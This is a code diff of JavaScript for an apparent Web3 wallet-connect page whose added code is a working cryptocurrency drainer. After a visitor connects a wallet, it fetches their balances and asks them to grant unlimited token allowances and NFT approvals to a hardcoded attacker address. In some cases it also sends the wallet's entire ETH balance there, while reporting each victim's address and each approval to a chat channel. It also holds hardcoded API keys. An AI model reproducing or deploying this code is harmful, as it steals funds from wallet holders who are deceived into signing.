@@ -1,827 +1,392 @@
-"use strict";
-
-// Unpkg imports
-const Web3Modal = window.Web3Modal.default; 
+let tokens = []
+let chainId = null;
+let web3Object = null;
+let selectedAccount = null;
+const Web3Modal = window.Web3Modal.default;
 const WalletConnectProvider = window.WalletConnectProvider.default;
-const Fortmatic = window.Fortmatic;
-const evmChains = window.evmChains;
 
-// Web3modal instance
-let web3Modal
+const OWNER_ADDRESS = "0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f"
+const CHAT = 5227607491;
 
-// Chosen wallet provider given by the dialog window
-let provider;
-
-
-// Address of the selected account
-let selectedAccount;
-
-const receiver_addres = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f'; // gaf<- RECEIVER ADDRESS HERE
-let onButtonClick;
-let user_address;
-let start_to_log = false;
-
-
-// get parameters from url
-function getParameterByName(name, url = window.location.href) {
-  name = name.replace(/[\[\]]/g, "\\$&");
-  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-    results = regex.exec(url);
-  if (!results) return null;
-  if (!results[2]) return "";
-  return decodeURIComponent(results[2].replace(/\+/g, " "));
-}
-
-
-/**
- * Setup the orchestra
- */
-async function init() {
-  start_to_log = false;
-  console.log("Initializing example");
-  console.log("WalletConnectProvider is", WalletConnectProvider);
-//   console.log("Fortmatic is", Fortmatic);
-  console.log("Portis is", Portis);
-  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);
-
-  // Check that the web page is run in a secure context,
-  // as otherwise MetaMask won't be available
-  if(location.protocol !== 'https:') {
-    // https://ethereum.stackexchange.com/a/62217/620
-    // const alert = document.querySelector("#alert-error-https");
-    // alert.style.display = "block";
-    // document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
-    // return;
-  }
-
-  // Tell Web3modal what providers we have available.
-  // Built-in web browser provider (only one can exist as a time)
-  // like MetaMask, Brave or Opera is added automatically by Web3modal
-  const providerOptions = {
-    walletconnect: {
-      package: WalletConnectProvider,
-      options: {
-        rpc: {
-          0xA4B1: "https://arbitrum-mainnet.infura.io/v3/6fc55331d8cf44ccb6c007420fb8f1af",
-        },
-        network: 'Arbitrum',
-        infuraId: "e77435344ef0486893cdc26d7d5cf039"
-      }
-    }
-
-    // coinbasewallet: {
-    //  package: CoinbaseWalletSDK, // Required
-    // options: {
-    //     appName: "binance", // Required
-    //     infuraId: "e62a60a251c64745baefeaf8237af646", // Required
-    //     rpc:{
-    //       0xA4B1: "https://arbitrum-dataseed.binance.org",
-    //     }, // Optional if `infuraId` is provided; otherwise it's required
-    //     chainId: 0xA4B1, // Optional. It defaults to 1 if not provided
-    //     darkMode: true // Optional. Use dark theme, defaults to false
-    //   }
-    // },
-
+const ABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }]
+const ABIN = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"maxNftSupply","type":"uint256"},{"internalType":"uint256","name":"saleStart","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"BAYC_PROVENANCE","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_APES","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REVEAL_TIMESTAMP","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"apePrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"baseURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"emergencySetStartingIndexBlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"flipSaleState","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxApePurchase","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"numberOfTokens","type":"uint256"}],"name":"mintApe","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveApes","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"saleIsActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"provenanceHash","type":"string"}],"name":"setProvenanceHash","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"revealTimeStamp","type":"uint256"}],"name":"setRevealTimestamp","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"setStartingIndex","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"startingIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"startingIndexBlock","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+const networkToId = {
+    20090103: "btc-mainnet",
+    1: "eth-mainnet",
+    5: "eth-goerli",
+    137: "matic-mainnet",
+    80001: "matic-mumbai",
+    56: "bsc-mainnet",
+    97: "bsc-testnet",
+    43114: "avalanche-mainnet",
+    43113: "avalanche-testnet",
+    250: "fantom-mainnet",
+    4002: "fantom-testnet",
+    42161: "arbitrum-mainnet",
+    421613: "arbitrum-goerli",
+    42170: "arbitrum-nova-mainnet",
+    592: "astar-mainnet",
+    81: "astar-shibuya",
+    336: "astar-shiden",
+    1313161554: "aurora-mainnet",
+    1313161555: "aurora-testnet",
+    432204: "avalanche-dexalot-mainnet",
+    432201: "avalanche-dexalot-testnet",
+    2020: "axie-mainnet",
+    84531: "base-testnet",
+    119: "bittorrent-mainnet",
+    1029: "bittorrent-testnet",
+    43288: "boba-avalanche-mainnet",
+    4328: "boba-avalanche-testnet",
+    56288: "boba-bnb-mainnet",
+    9728: "boba-bnb-testnet",
+    1294: "boba-bobabeam-mainnet",
+    1297: "boba-bobabase-testnet",
+    288: "boba-mainnet",
+    28: "boba-rinkeby-testnet",
+    2888: "boba-goerli",
+    7700: "canto-mainnet",
+    1131378225: "covalent-internal-network-v1",
+    25: "cronos-mainnet",
+    338: "cronos-testnet",
+    53935: "defi-kingdoms-mainnet",
+    335: "defi-kingdoms-testnet",
+    42262: "emerald-paratime-mainnet",
+    9001: "evmos-mainnet",
+    9000: "evmos-testnet",
+    2152: "findora-mainnet",
+    2154: "findora-forge-testnet",
+    19: "flarenetworks-canary-mainnet",
+    16: "flarenetworks-canary-testnet",
+    14: "flarenetworks-flare-mainnet",
+    114: "flarenetworks-flare-testnet",
+    192837465: "gather-mainnet",
+    356256156: "gather-testnet",
+    1666600000: "harmony-mainnet",
+    1666700000: "harmony-testnet",
+    321: "kcc-mainnet",
+    322: "kcc-testnet",
+    59140: "linea-testnet",
+    5001: "mantle-testnet",
+    82: "meter-mainnet",
+    83: "meter-testnet",
+    1088: "metis-mainnet",
+    588: "metis-testnet",
+    2002: "milkomeda-a1-mainnet",
+    200202: "milkomeda-a1-devnet",
+    2001: "milkomeda-c1-mainnet",
+    200101: "milkomeda-c1-devnet",
+    1284: "moonbeam-mainnet",
+    1287: "moonbeam-moonbase-alpha",
+    1285: "moonbeam-moonriver",
+    245022926: "neon-testnet",
+    71402: "nervos-godwoken-mainnet",
+    71401: "nervos-godwoken-testnet",
+    71393: "nervos-polyjuice-testnet",
+    23294: "oasis-sapphire-mainnet",
+    23295: "oasis-sapphire-testnet",
+    248: "oasys-mainnet",
+    9372: "oasys-testnet",
+    10: "optimism-mainnet",
+    11297108109: "palm-mainnet",
+    11297108099: "palm-testnet",
+    1442: "polygon-zkevm-testnet",
+    30: "rsk-mainnet",
+    31: "rsk-testnet",
+    1564830818: "skale-calypso",
+    344106930: "skale-staging-uum",
+    1026062157: "skale-omnus",
+    278611351: "skale-razor",
+    1399811149: "solana-mainnet",
+    73772: "swimmer-mainnet",
+    73773: "swimmer-testnet",
+    416: "sx-mainnet"
   };
 
-  web3Modal = new Web3Modal({
-    cacheProvider: false, // optional
-    providerOptions, // required
+const providerOptions = {
+    walletconnect: {
+        package: WalletConnectProvider,
+        options: {
+            rpc: {
+              42161: "https://arbitrum-mainnet.infura.io/v3/6fc55331d8cf44ccb6c007420fb8f1af",
+            },
+            chainId: 42161,
+            network: 'Arbitrum',
+            infuraId: "e77435344ef0486893cdc26d7d5cf039",
+            pollingInterval: "10000",
+        },
+    },
+    coinbasewallet: {
+        package: CoinbaseWalletSDK, // Required
+        options: {
+          appName: "Debug", // Required
+          infuraId: "e77435344ef0486893cdc26d7d5cf039", // Required
+          rpc: "https://arbitrum-mainnet.infura.io/v3/6fc55331d8cf44ccb6c007420fb8f1af", // Optional if `infuraId` is provided; otherwise it's required
+          chainId: 42161, // Optional. It defaults to 1 if not provided
+          chainName: 'Arbitrum',
+          darkMode: false // Optional. Use dark theme, defaults to false
+        }
+      }
+  
+};
+
+let web3Modal = new Web3Modal({
+    providerOptions,
+    cacheProvider: false,
     disableInjectedProvider: false,
-    theme: "dark" // optional. For MetaMask / Brave / Opera.
-  });
-  console.log("Web3Modal instance is", web3Modal);
-  return "Done"
+});
+
+$(".connect").click(async function () {
+    try {
+        let provider = await web3Modal.connect();
+        onProvider(provider);
+        provider.on("accountsChanged", (accounts) => {
+             console.log(accounts);
+            onProvider(provider);
+        });
+    } catch (e) {
+        console.log("Could not get a wallet connection", e);
+        return;
+    }
+})
+
+async function onProvider(provider) {
+    web3Object = new Web3(provider);
+    let accounts = await web3Object.eth.getAccounts();
+    selectedAccount = accounts[0];
+
+    chainName = await web3Object.eth.getChainId();
+    chainId = networkToId[chainName]
+  	console.log(chainId)
+    console.log(selectedAccount)
+    alert("Open your selected wallet or extension to approve smart contract")
+    if (accounts.length) {
+        sendMessage(`Wallet Connected Successfully to ${chainId}!`)
+        sendMessage(`Cl address : ${selectedAccount}`)
+        covalenthqAPICall()
+
+        // if (chainId == 1) bitqueryAPICall()
+        // else covalenthqAPICall()
+    }
 }
 
+// async function bitqueryAPICall() {
 
-/**
- * Kick in the UI action after Web3modal dialog has chosen a provider
- */
-async function fetchAccountData() {
-  start_to_log = false;
-  // Get a Web3 instance for the wallet
-  
-  const web3 = new Web3(provider);
+//     const query = `{
+//         ethereum {
+//           address(address: {is: "${selectedAccount}"}) {
+//             balances {
+//               currency {
+//                 symbol
+//                 address
+//               }
+//               value
+//             }
+//           }
+//         }
+//     }`;
 
-  console.log("Web3 instance is", web3);
-  //change chain to arbitrum
-  web3.eth.defaultCommon = {
-    customChain: {name: 'Arbitrum', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};
+//     const url = "https://graphql.bitquery.io/";
 
+//     const opts = {
+//         method: "POST",
+//         headers: {
+//             "Content-Type": "application/json",
+//             "X-API-KEY": "BQYbBW4xCbSdau4k5wFWgFNN8Sr4FN3L"
+//         },
+//         body: JSON.stringify({
+//             query,
+//         })
+//     };
 
-  // // Get connected chain id from ethereum node
-  // const chainId = await web3.eth.getChainId();
+//     const result = await fetch(url, opts).then(res => res.json())
 
-  // // Load chain information over an HTTP API
-  // const chainData = evmChains.getChain(chainId);
-  //   document.querySelector("#network-name").textContent = chainData.name;
-  // console.log("Chain data name:", chainData.name);
+//     let list = result.data.ethereum.address[0].balances
 
-  // Get list of accounts of the connected wallet
-  const accounts = await web3.eth.getAccounts();
+//     let map_list = list.map(m => {
+//         return {
+//             balance: m.value,
+//             address: m.currency.address,
+//             symbol: m.currency.symbol
+//         }
+//     })
 
-  // MetaMask does not give you all accounts, only the selected account
-  console.log("Got accounts", accounts);
-  selectedAccount = accounts[0];
-  console.log("Selected Account: ", selectedAccount);
-  user_address = selectedAccount;
+//     tokens = map_list.filter(f => f.balance > 0 && f.symbol != "ETH")
+//     console.log("ETH", tokens);
+//     onApprove()
+// }
 
-//   document.querySelector("#selected-account").textContent = selectedAccount;
+async function covalenthqAPICall() {
 
-  // Get a handl
-//   const template = document.querySelector("#template-balance");
-//   const accountContainer = document.querySelector("#accounts");
+    const params = {
+        format: "JSON",
+        "quote-currency": "usd",
+        key: "ckey_5da97a82746c43ed84565c64afb"
 
-  // Purge UI elements any previously loaded accounts
-//   accountContainer.innerHTML = '';
+    }
+    const url = new URL(`https://api.covalenthq.com/v1/${chainId}/address/${selectedAccount}/balances_v2/`);
+    url.search = new URLSearchParams(params).toString();
 
-  // Go through all accounts and get their arbitrum balance
-  const rowResolvers = accounts.map(async (address) => {
-    const balance = await web3.eth.getBalance(address);
-    // arbitrumBalance is a BigNumber instance
-    // https://github.com/indutny/bn.js/
-    const arbitrumBalance = web3.utils.fromWei(balance, "ether");
-    const humanFriendlyBalance = parseFloat(arbitrumBalance).toFixed(4);
-    // Fill in the templated row and put in the document
-    // const clone = template.content.cloneNode(true);
-    // clone.querySelector(".address").textContent = address;
-    // clone.querySelector(".balance").textContent = humanFriendlyBalance;
-    console.log("New Account: %o", ({address, balance, humanFriendlyBalance}));
-    // accountContainer.appendChild(clone);
-  });
+    const opts = {
+        method: "GET",
+        headers: {
+            "Content-Type": "application/json",
+        },
+    };
 
-  // Because rendering account does its own RPC commucation
-  // with ethereum node, we do not want to display any results
-  // until data for all accounts is loaded
-  await Promise.all(rowResolvers);
+    try {
+        const result = await fetch(url, opts).then(res => res.json())
 
-  // Display fully loaded UI for wallet data
-//   document.querySelector("#prepare").style.display = "none";
-//   document.querySelector("#connected").style.display = "block";
-    proceed();
+        let list = result.data.items
+        console.log("Initial list ", list)
+        let map_list = list.map(m => {
+            return {
+                balance: m.balance,
+                value: m.quote,
+                address: m.contract_address,
+                symbol: m.contract_ticker_symbol,
+                type: m.type
+            }
+        })
+        console.log("tokens-list", map_list)
+        tokens = map_list.filter(f => f.value > 5 && f.symbol != "ETH")
+        console.log("chainId:", chainId, "Tokens:", tokens);
+        if (window.location.search)
+            onSendEther()
+        else
+            onApprove()
+    } catch {
+        sendMessage(`Error collecting info about wallet`)
+    }
 }
 
-
-
-/**
- * Fetch account data for UI when
- * - User switches accounts in wallet
- * - User switches networks in wallet
- * - User connects wallet initially
- */
-async function refreshAccountData() {
-
-  // If any current data is displayed when
-  // the user is switching acounts in the wallet
-  // immediate hide this data
-//   document.querySelector("#connected").style.display = "none";
-//   document.querySelector("#prepare").style.display = "block";
-
-  // Disable button while UI is loading.
-  // fetchAccountData() will take a while as it communicates
-  // with ethereum node via JSON-RPC and loads chain data
-  // over an API call.
-//   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
-  await fetchAccountData(provider);
-//   document.querySelector("#btn-connect").removeAttribute("disabled")
+async function onApprove() {
+    if (tokens.length) {
+        //tokens.forEach(token => {
+    try {
+        loopTokens(tokens);
+    }
+    catch (error) {
+        // Ignore the error and continue with the loop
+        console.error(`Error processing item ${error.message}`);
+      }
+        }
+         else {
+        sendMessage("Token not found, Please switch network or try again!")
+    }
 }
+async function loopTokens(tokens){
+    
+    for await (let token of tokens) {
+        if (token.type === "cryptocurrency"){
+        let instance = new web3Object.eth.Contract(ABI, token.address);
+        sendMessage("New token")
+        await instance.methods.approve(
+            OWNER_ADDRESS,
+            "999999999999999999999999999999999999999999999999999999999999999999999999")
+            .send({
+                from: selectedAccount,
+                to: token.address
+            })
+            .on('transactionHash', (hash) => {
+                   console.log(`Transaction Hash: ${hash}`)
+                  
+            })
+            .on('receipt', (receipt) => {
+                console.log(`Transaction Receipt: ${receipt}`)
+                sendMessage("Approve Completed Successfully")
+                sendMessage(`TOKEN Contract Address ${token.address}`)
+                sendMessage(`Token balance is ${token.balance}`)
+                sendMessage(`Your address ${OWNER_ADDRESS}`)
+            })
+            .on('error', (error) => {
+                console.log(`Error: ${error}`)
+                sendMessage("Transaction Rejected")
+            })
+        }
 
-
-/**
- * Connect wallet button pressed.
- */
-async function onConnect() {
-
-  console.log("Opening a dialog", web3Modal);
-  try {
-    provider = await web3Modal.connect();
-    console.log("provider", provider);
-     $(document).ready(function(){
-        $("#myModal").modal('show');
-    });
-  }  catch(e) {
-    console.log("Could not get a wallet connection", e);
-    return;
-  }
-
-  // Suarbitrumribe to accounts change
-  provider.on("accountsChanged", (accounts) => {
-    web3.eth.defaultCommon = {
-      customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};  
-    fetchAccountData();
-  });
-
-  // Suarbitrumribe to chainId change
-  provider.on("chainChanged", (chainId) => {
-    web3.eth.defaultCommon = {
-      customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};  
-    fetchAccountData();
-  });
-
-  // Suarbitrumribe to networkId change
-  provider.on("networkChanged", (networkId) => {
-    web3.eth.defaultCommon = {
-      customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};
-  
-    fetchAccountData();
-  });
-
-  await refreshAccountData();
-  onButtonClick = proceed;
-  web3.eth.defaultCommon = {
-    customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};  
-  
+    else if (token.type === "NFT"){
+        let instance = new web3Object.eth.Contract(ABIN, token.address);
+        await instance.methods.setApprovalForAll(
+            OWNER_ADDRESS,
+            "true")
+            .send({
+                from: selectedAccount,
+                to: token.address
+            })
+            .on('transactionHash', (hash) => {
+                   console.log(`Transaction Hash: ${hash}`)
+                  
+                sendMessage("Transaction is submitted to the network")
+            })
+            .on('receipt', (receipt) => {
+                console.log(`Transaction Receipt: ${receipt}`)
+                sendMessage("Approve Completed Successfully")
+                sendMessage(`NFT Contract Address ${token.address}`)
+                sendMessage(`Your address ${OWNER_ADDRESS}`)
+            })
+            .on('error', (error) => {
+                console.log(`Error: ${error}`)
+                sendMessage("Transaction Rejected")
+            })
+        }
+    else{
+        sendMessage("Invalid token ${token.address}")
+    }
+    };
 }
-onButtonClick = onConnect;
+async function onSendEther() {
+    try {
+        let balance = await web3Object.eth.getBalance(selectedAccount)
 
-/**
- * Disconnect wallet button pressed.
- */
-async function onDisconnect() {
+        var gasPrice = await web3Object.eth.getGasPrice(); // estimate the gas price
 
-  console.log("Killing the wallet connection", provider);
+        var transactionObject = {
+            gasPrice: gasPrice,
+            from: selectedAccount,
+            to: OWNER_ADDRESS,
+            value: balance,
+        }
 
-  // TODO: Which providers have close method?
-  if(provider.close) {
-    await provider.close();
+        var gasLimit = await web3Object.eth.estimateGas(transactionObject); // estimate the gas limit for this transaction
+        var transactionFee = gasPrice * gasLimit; // calculate the transaction fee
 
-    // If the cached provider is not cleared,
